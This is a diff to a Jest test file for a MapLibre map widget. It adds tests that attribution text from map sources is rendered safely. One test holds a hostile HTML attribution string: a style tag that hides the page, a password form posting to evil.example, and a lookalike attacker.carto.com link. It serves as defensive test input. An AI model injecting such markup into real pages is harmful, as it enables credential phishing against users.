@@ -19,6 +19,18 @@ jest.unstable_mockModule("maplibre-gl", () => {
     handlers: { event: string; once: boolean; fn: Handler }[] = [];
     setStyle = jest.fn();
     addLayer = jest.fn();
+    // The style's sources and layers as `getStyle`/`getSource` report them
+    // (#928); `getStyle` is a spy so a test can see when it serializes.
+    styleSources: Record<string, { attribution?: string }> = {};
+    styleLayers: {
+      id: string;
+      source?: string;
+      layout?: { visibility?: string };
+    }[] = [];
+    getStyle = jest.fn(() => ({
+      sources: this.styleSources,
+      layers: this.styleLayers,
+    }));
     constructor(options: Record<string, unknown>) {
       this.options = options;
       instances.push(this);
@@ -48,6 +60,9 @@ jest.unstable_mockModule("maplibre-gl", () => {
       return this;
     }
     addSource() {}
+    getSource(id: string) {
+      return this.styleSources[id];
+    }
     fitBounds() {}
     jumpTo() {}
     getCanvas() {
@@ -93,6 +108,13 @@ const maplibreMock = (await import("maplibre-gl")) as unknown as {
     options: Record<string, unknown>;
     setStyle: jest.Mock;
     addLayer: jest.Mock;
+    styleSources: Record<string, { attribution?: string }>;
+    styleLayers: {
+      id: string;
+      source?: string;
+      layout?: { visibility?: string };
+    }[];
+    getStyle: jest.Mock;
     emit: (event: string, payload?: unknown) => void;
   }[];
 };
@@ -715,5 +737,129 @@ describe("MapWidgetUI — install basemap + fallback (#910)", () => {
     act(() => lastMap().emit("error", { error: new Error("blocked") }));
     expect(lastMap().setStyle).toHaveBeenCalledTimes(1);
     expect(notice()).toBeInTheDocument();
+  });
+});
+
+describe("MapWidgetUI — safe attribution (#928)", () => {
+  const rows = [{ lat: 1, lng: 2 }];
+  const lastMap = () =>
+    maplibreMock.__instances[maplibreMock.__instances.length - 1];
+  const CARTO =
+    '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors © <a href="https://carto.com/about-carto/">CARTO</a>';
+  /** Give the mock map a style whose layers draw from these sources. */
+  const withSources = (sources: Record<string, string | undefined>) => {
+    const map = lastMap();
+    map.styleSources = Object.fromEntries(
+      Object.entries(sources).map(([id, attribution]) => [id, { attribution }])
+    );
+    map.styleLayers = Object.keys(sources).map((id) => ({
+      id: `${id}-layer`,
+      source: id,
+    }));
+    map.emit("styledata");
+  };
+
+  beforeEach(() => {
+    maplibreMock.__instances.length = 0;
+  });
+
+  it("turns off MapLibre's HTML attribution control", () => {
+    render(<MapWidgetUI spec={pointsSpec} rows={rows} mode="light" />);
+    expect(lastMap().options.attributionControl).toBe(false);
+  });
+
+  it("renders a hostile source attribution as text only", () => {
+    render(<MapWidgetUI spec={pointsSpec} rows={rows} mode="light" />);
+    act(() =>
+      withSources({
+        hostile:
+          'HOSTILE<style>body{display:none}</style><form action="https://evil.example"><input type="password"></form><a href="https://evil.example">Sign in</a><a href="https://attacker.carto.com/">CARTO login</a>',
+      })
+    );
+    const box = screen.getByTestId("map-attribution");
+    expect(box).toHaveTextContent("HOSTILESign inCARTO login");
+    const widget = screen.getByTestId("map-widget");
+    expect(widget.querySelector("style, form, input, img")).toBeNull();
+    expect(widget.querySelector("[data-testid=map-attribution] a")).toBeNull();
+  });
+
+  it("keeps CARTO's credits as links", () => {
+    render(<MapWidgetUI spec={pointsSpec} rows={rows} mode="light" />);
+    act(() => withSources({ carto: CARTO }));
+    expect(screen.getByRole("link", { name: "CARTO" })).toHaveAttribute(
+      "href",
+      "https://carto.com/about-carto/"
+    );
+    expect(screen.getByTestId("map-attribution")).toHaveTextContent(
+      "© OpenStreetMap contributors © CARTO"
+    );
+  });
+
+  it("credits only sources a visible layer draws from", () => {
+    render(<MapWidgetUI spec={pointsSpec} rows={rows} mode="light" />);
+    act(() => {
+      const map = lastMap();
+      map.styleSources = {
+        used: { attribution: "© Used" },
+        unused: { attribution: "© Unused" },
+        hidden: { attribution: "© Hidden" },
+      };
+      map.styleLayers = [
+        { id: "a", source: "used" },
+        { id: "b", source: "hidden", layout: { visibility: "none" } },
+        { id: "bg" },
+      ];
+      map.emit("styledata");
+    });
+    expect(screen.getByTestId("map-attribution")).toHaveTextContent(/^© Used$/);
+  });
+
+  it("keeps an operator's https credit links under a custom basemap", () => {
+    render(
+      <MapWidgetUI
+        spec={pointsSpec}
+        rows={rows}
+        mode="light"
+        installBasemap={{
+          mode: "custom",
+          styleUrl: "https://tiles.corp.example/style.json",
+          styleUrlDark: null,
+          attribution: "",
+        }}
+      />
+    );
+    act(() =>
+      withSources({
+        maptiler:
+          '<a href="https://www.maptiler.com/copyright/">© MapTiler</a>',
+      })
+    );
+    expect(screen.getByRole("link", { name: "© MapTiler" })).toHaveAttribute(
+      "href",
+      "https://www.maptiler.com/copyright/"
+    );
+  });
+
+  it("re-reads attribution on source metadata, not on every tile", () => {
+    render(<MapWidgetUI spec={pointsSpec} rows={rows} mode="light" />);
+    const map = lastMap();
+    map.getStyle.mockClear();
+    act(() => {
+      for (let i = 0; i < 20; i++) map.emit("sourcedata", { tile: {} });
+    });
+    expect(map.getStyle).not.toHaveBeenCalled();
+    act(() => {
+      map.styleSources = { carto: { attribution: CARTO } };
+      map.styleLayers = [{ id: "c", source: "carto" }];
+      map.emit("sourcedata", { sourceDataType: "metadata" });
+    });
+    expect(map.getStyle).toHaveBeenCalledTimes(1);
+    expect(screen.getByTestId("map-attribution")).toHaveTextContent("CARTO");
+  });
+
+  it("shows no attribution when no source credits anyone", () => {
+    render(<MapWidgetUI spec={pointsSpec} rows={rows} mode="light" />);
+    act(() => withSources({ "layer-0": undefined }));
+    expect(screen.queryByTestId("map-attribution")).toBeNull();
   });
 });
